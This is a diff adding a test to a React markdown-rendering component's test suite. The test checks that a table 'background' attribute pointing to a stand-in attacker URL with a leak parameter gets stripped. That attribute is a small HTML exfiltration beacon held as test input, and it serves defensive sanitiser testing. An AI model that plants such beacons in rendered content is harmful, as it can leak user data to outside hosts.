@@ -89,6 +89,21 @@ describe('MarkdownMessage', () => {
       expect(container.querySelector('style')).toBeNull()
     })
 
+    it('should not keep a background attribute that could beacon out via a URL', async () => {
+      const { container } = render(
+        <MarkdownMessage>
+          {'Marker text. ' +
+            '<table background="https://attacker.example/?leak=1"><tr><td>x</td></tr></table>'}
+        </MarkdownMessage>,
+      )
+
+      await waitFor(() => {
+        expect(screen.getByText(/Marker text\./)).toBeInTheDocument()
+      })
+
+      expect(container.querySelector('[background]')).toBeNull()
+    })
+
     it('should not render a raw <link> element that could load external resources', async () => {
       const { container } = render(
         <MarkdownMessage>
